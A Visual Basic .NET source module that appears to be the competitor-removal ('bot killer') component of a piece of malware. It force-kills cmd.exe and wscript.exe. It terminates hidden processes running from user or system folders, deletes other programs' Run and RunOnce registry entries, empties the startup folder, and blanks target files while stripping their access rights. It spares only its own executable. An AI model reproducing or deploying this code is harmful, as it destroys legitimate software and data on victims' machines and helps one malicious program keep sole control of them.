
Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Threading
Imports System.Text
Imports System.ComponentModel
Imports System.Security.AccessControl
Imports Microsoft.Win32
Imports System.Security.Principal

Module CLN
    Dim ProccessKilled As Integer = 0
    Dim Startupkilled As Integer = 0
    <DllImport("user32.dll", SetLastError:=True)>
    Private Function IsWindowVisible(ByVal hWnd As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Function FindWindow(ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr
    End Function
    Public Sub RunStandardCLNME()
        On Error Resume Next
        Shell("TASKKILL /F /IM wscript.exe", AppWinStyle.Hide)
        Shell("TASKKILL /F /IM cmd.exe", AppWinStyle.Hide)
        ScanProcess()
        RunStartupKiller()
        ProccessKilled = 0
        Startupkilled = 0
    End Sub
    Public Sub ScanProcess()
        Try
            Dim Proc As Process() = Process.GetProcesses()
            Dim FullPath As String
            For x As Integer = 0 To Proc.Length - 1
                Dim p As Process = Proc(x)
                Try
                    FullPath = IO.Path.GetFullPath(p.MainModule.FileName)
                    If IsFileMalicious(FullPath) Then
                        If Not WindowIsVisible(p.MainWindowTitle) Then
                            TerminateProcess(p.Id)
                            DestroyFile(FullPath)
                            ProccessKilled = ProccessKilled + 1
                        End If
                    End If
                Catch : End Try
            Next
        Catch : End Try
    End Sub
    Public Function IsFileMalicious(ByVal fileloc As String) As Boolean
        On Error Resume Next
        If fileloc.Contains(Application.ExecutablePath) Then
            Return False
        End If
        If fileloc.ToLower.Contains("malware") Then
            DestroyFile(fileloc)
        End If
        If fileloc.Contains("Google.com") Then
            Return False
        End If
        If fileloc.Contains("Microsoft.com") Then
            Return False
        End If
        If fileloc.Contains("cmd") Then
            Return True
        End If
        If fileloc.Contains("wscript") Then
            Return True
        End If
        If fileloc.Contains(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory) Then
            Return True
        End If
        If WinTrust.VerifyEmbeddedSignature(fileloc) = True Then
            Return False
        End If
        If (fileloc.Contains(Environment.GetEnvironmentVariable("USERPROFILE")) Or fileloc.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))) Then
            Return True
        End If
        Dim attributes As FileAttributes
        attributes = File.GetAttributes(fileloc)
        If (attributes And FileAttributes.System) = FileAttributes.System Then
            Return True
        End If
        If (attributes And FileAttributes.Hidden) = FileAttributes.Hidden Then
            Return True
        End If
        Return False
    End Function
    Public Sub KillFile(ByVal location As String) 'Completely Kill Files
        Try
            Dim FolderPath As String = location
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity
            FolderAcl.SetAccessRuleProtection(True, False)
            FolderInfo.SetAccessControl(FolderAcl)
        Catch : End Try
    End Sub
    Public Function WindowIsVisible(ByVal WinTitle As String) As Boolean
        Try
            Dim lHandle As IntPtr
            lHandle = FindWindow(vbNullString, WinTitle)
            Return IsWindowVisible(lHandle)
        Catch
            Return False
        End Try
    End Function
    Public Sub RunStartupKiller()
        On Error Resume Next
        StartupFucker("Software\Microsoft\Windows\CurrentVersion\Run\", 1)
        StartupFucker("Software\Microsoft\Windows\CurrentVersion\RunOnce\", 1)
        If IsAdmin() Then
            StartupFucker("Software\Microsoft\Windows\CurrentVersion\Run\", 2)
            StartupFucker("Software\Microsoft\Windows\CurrentVersion\RunOnce\", 2)
        End If


        Dim tehfilesandshit() As String = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
        For Each workload In tehfilesandshit
            If Not workload.Contains(".ini") Then
                DestroyFile(workload)
                Thread.Sleep(50)
                DestroyFile(workload)
                Thread.Sleep(50)
                DestroyFile(workload)
            End If
        Next

    End Sub

    Public Sub StartupFucker(ByVal regkey As String, ByVal type As Integer)
        Try

            Dim reg As Microsoft.Win32.RegistryKey
            If type = 1 Then
                reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(regkey)
            End If
            If type = 2 Then
                reg = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(regkey)
            End If
            For Each s As String In reg.GetValueNames
                Try
                    Dim asdf As String = reg.GetValue(s).ToString
                    If asdf.Contains("-") Then
                        If asdf.Contains("""") Then asdf.Replace("""", String.Empty)
                        Try
                            Dim lol() As String = Split(asdf, " -")
                            asdf = lol(0)
                        Catch : End Try
                    End If
                    If asdf.Contains("""") Then
                        Dim lol() = asdf.Split("""")
                        asdf = lol(1)
                    End If

                    If Not asdf.Contains(Application.ExecutablePath) Then
                        RemoveKey(type, s, regkey, asdf)
                        If WinTrust.VerifyEmbeddedSignature(asdf) = False Then
                            TerminateProcessPath(asdf)
                            DestroyFile(asdf)
                        End If
                    End If

                Catch : End Try
            Next
        Catch : End Try
    End Sub
    Public Sub RemoveKey(ByVal Reg As Integer, ByVal file As String, ByVal reglocation As String, ByVal FileLocation As String)
        Try
            Dim name As String = reglocation
            Dim key As RegistryKey = Nothing
            If Reg = 1 Then

                key = Registry.CurrentUser.OpenSubKey(name, True)

            Else
                key = Registry.LocalMachine.OpenSubKey(name, True)

            End If
            Using key
                If (Not key Is Nothing) Then
                    key.DeleteValue(file)
                    '    DeletedKeys = DeletedKeys + 1
                End If
            End Using
        Catch : End Try
    End Sub
    Public Sub DestroyFile(ByVal path As String)
        Try
            If IO.File.Exists(path) Then
                Dim r As New Random
                Try
                    AllowAccess(path)
                    My.Computer.FileSystem.MoveFile(path, IO.Path.GetTempPath & r.Next(10000, 90000))
                    IO.File.WriteAllText(path, String.Empty)
                    FileOpen(FreeFile, path, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite)
                    KillFile(path)
                Catch
                    Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(path)
                    Dim FolderAcl As New DirectorySecurity
                    FolderAcl.SetAccessRuleProtection(True, False)
                    FolderInfo.SetAccessControl(FolderAcl)
                End Try
            End If
        Catch : End Try
    End Sub
    Public Function IsAdmin() As Boolean
        Try
            Dim id As WindowsIdentity = WindowsIdentity.GetCurrent()

            Dim p As WindowsPrincipal = New WindowsPrincipal(id)

            Return p.IsInRole(WindowsBuiltInRole.Administrator)

        Catch
            Return False
        End Try

    End Function
    Public Sub AllowAccess(ByVal location As String)
        Try
            Dim FolderPath As String = location
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity
            FolderAcl.SetAccessRuleProtection(False, True)
            FolderInfo.SetAccessControl(FolderAcl)
        Catch : End Try
    End Sub
    Public Sub TerminateProcessPath(ByVal Path As String)
        Try
            If Not Path.Contains(Process.GetCurrentProcess.ProcessName.ToString) Then
                If Path.Contains("\") Then
                    Dim lol() As String = Split(Path, "\")
                    For Each xd As String In lol
                        If xd.Contains(".exe") Then Path = xd
                    Next
                End If
                If Path.Contains(".exe") Then Path = Path.Replace(".exe", String.Empty)
                Dim Proc As Process() = Process.GetProcesses()
                For x As Integer = 0 To Proc.Length - 1
                    Dim p As Process = Proc(x)
                    If p.ProcessName.Contains(Path) Then
                        TerminateProcess(p.Id)
                    End If
                Next
            End If
        Catch : End Try
    End Sub
    Public Sub TerminateProcess(ByVal PID As Integer)
        Try
            Dim processById As Process = Process.GetProcessById(PID)
            If (processById.ProcessName <> String.Empty) Then
                Dim enumerator As IEnumerator
                Try
                    enumerator = processById.Threads.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ProcessThread = DirectCast(enumerator.Current, ProcessThread)
                        Dim hThread As IntPtr = OpenThread((ThreadAccess.SUSPEND_RESUME Or ThreadAccess.TERMINATE), True, DirectCast(current.Id, Integer))
                        If (hThread <> IntPtr.Zero) Then
                            SuspendThread(hThread)
                            TerminateThread(hThread, 1)
                            CloseHandle(hThread)
                        End If
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        Catch : End Try
    End Sub
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Function CloseHandle(ByVal hHandle As IntPtr) As Boolean
    End Function
    <DllImport("kernel32.dll")>
    Private Function OpenThread(ByVal dwDesiredAccess As ThreadAccess, ByVal bInheritHandle As Boolean, ByVal dwThreadId As UInt32) As IntPtr
    End Function
    <DllImport("kernel32.dll", SetLastError:=True)>
    Public Function SuspendThread(ByVal hThread As IntPtr) As Integer
    End Function
    <DllImport("kernel32.dll")>
    Private Function TerminateThread(ByVal hThread As IntPtr, ByVal dwExitCode As UInt32) As Boolean
    End Function
    Public Enum ThreadAccess
        ' Fields
        DIRECT_IMPERSONATION = &H200
        GET_CONTEXT = 8
        IMPERSONATE = &H100
        QUERY_INFORMATION = &H40
        SET_CONTEXT = &H10
        SET_INFORMATION = &H20
        SET_THREAD_TOKEN = &H80
        SUSPEND_RESUME = 2
        TERMINATE = 1
    End Enum
#Region "WinTrustData struct field enums"
    Enum WinTrustDataUIChoice As UInteger
        All = 1
        None = 2
        NoBad = 3
        NoGood = 4
    End Enum
    Enum WinTrustDataRevocationChecks As UInteger
        None = &H0
        WholeChain = &H1
    End Enum
    Enum WinTrustDataChoice As UInteger
        File = 1
        Catalog = 2
        Blob = 3
        Signer = 4
        Certificate = 5
    End Enum
    Enum WinTrustDataStateAction As UInteger
        Ignore = &H0
        Verify = &H1
        Close = &H2
        AutoCache = &H3
        AutoCacheFlush = &H4
    End Enum
    <FlagsAttribute()>
    Enum WinTrustDataProvFlags As UInteger
        UseIe4TrustFlag = &H1
        NoIe4ChainFlag = &H2
        NoPolicyUsageFlag = &H4
        RevocationCheckNone = &H10
        RevocationCheckEndCert = &H20
        RevocationCheckChain = &H40
        RevocationCheckChainExcludeRoot = &H80
        SaferFlag = &H100
        HashOnlyFlag = &H200
        UseDefaultOsverCheck = &H400
        LifetimeSigningFlag = &H800
        CacheOnlyUrlRetrieval = &H1000
    End Enum
    ' affects CRL retrieval and AIA retrieval
    Enum WinTrustDataUIContext As UInteger
        Execute = 0
        Install = 1
    End Enum
#End Region
#Region "WinTrust structures"
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
    Class WinTrustFileInfo
        Private StructSize As Integer = DirectCast(Marshal.SizeOf(GetType(WinTrustFileInfo)), Integer)
        Private pszFilePath As IntPtr
        ' required, file name to be verified
        Private hFile As IntPtr = IntPtr.Zero
        ' optional, open handle to FilePath
        Private pgKnownSubject As IntPtr = IntPtr.Zero
        ' optional, subject type if it is known
        Public Sub New(ByVal _filePath As String)
            pszFilePath = Marshal.StringToCoTaskMemAuto(_filePath)
        End Sub
        Protected Overrides Sub Finalize()
            Try
                Marshal.FreeCoTaskMem(pszFilePath)
            Finally
                MyBase.Finalize()
            End Try
        End Sub
    End Class
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
    Class WinTrustData
        Private StructSize As Integer = DirectCast(Marshal.SizeOf(GetType(WinTrustData)), Integer)
        Private PolicyCallbackData As IntPtr = IntPtr.Zero
        Private SIPClientData As IntPtr = IntPtr.Zero
        ' required: UI choice
        Private UIChoice As WinTrustDataUIChoice = WinTrustDataUIChoice.None
        ' required: certificate revocation check options
        Private RevocationChecks As WinTrustDataRevocationChecks = WinTrustDataRevocationChecks.None
        ' required: which structure is being passed in?
        Private UnionChoice As WinTrustDataChoice = WinTrustDataChoice.File
        ' individual file
        Private FileInfoPtr As IntPtr
        Private StateAction As WinTrustDataStateAction = WinTrustDataStateAction.Ignore
        Private StateData As IntPtr = IntPtr.Zero
        Private URLReference As String = Nothing
        Private ProvFlags As WinTrustDataProvFlags = WinTrustDataProvFlags.SaferFlag
        Private UIContext As WinTrustDataUIContext = WinTrustDataUIContext.Execute
        ' constructor for silent WinTrustDataChoice.File check
        Public Sub New(ByVal _fileName As String)
            Dim wtfiData As New WinTrustFileInfo(_fileName)
            FileInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(GetType(WinTrustFileInfo)))
            Marshal.StructureToPtr(wtfiData, FileInfoPtr, False)
        End Sub
        Protected Overrides Sub Finalize()
            Try
                Marshal.FreeCoTaskMem(FileInfoPtr)
            Finally
                MyBase.Finalize()
            End Try
        End Sub
    End Class
#End Region
    Enum WinVerifyTrustResult As Integer
        Success = 0
        ProviderUnknown = &H800B0001
        ' The trust provider is not recognized on this system
        ActionUnknown = &H800B0002
        ' The trust provider does not support the specified action
        SubjectFormUnknown = &H800B0003
        ' The trust provider does not support the form specified for the subject
        SubjectNotTrusted = &H800B0004
        ' The subject failed the specified verification action
    End Enum
    NotInheritable Class WinTrust
        Private Shared ReadOnly INVALID_HANDLE_VALUE As New IntPtr(-1)
        ' GUID of the action to perform
        Private Const WINTRUST_ACTION_GENERIC_VERIFY_V2 As String = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
        <DllImport("wintrust.dll", ExactSpelling:=True, SetLastError:=False, CharSet:=CharSet.Unicode)>
        Private Shared Function WinVerifyTrust(<[In]()> ByVal hwnd As IntPtr, <[In]()> <MarshalAs(UnmanagedType.LPStruct)> ByVal pgActionID As Guid, <[In]()> ByVal pWVTData As WinTrustData) As WinVerifyTrustResult
        End Function
        ' call WinTrust.WinVerifyTrust() to check embedded file signature
        Public Shared Function VerifyEmbeddedSignature(ByVal fileName As String) As Boolean
            Try
                Dim wtd As New WinTrustData(fileName)
                Dim guidAction As New Guid(WINTRUST_ACTION_GENERIC_VERIFY_V2)
                Dim result As WinVerifyTrustResult = WinVerifyTrust(INVALID_HANDLE_VALUE, guidAction, wtd)
                Dim ret As Boolean = (result = WinVerifyTrustResult.Success)
                Return ret
            Catch
                Return False
            End Try
        End Function
        Private Sub New()
        End Sub
    End Class

End Module
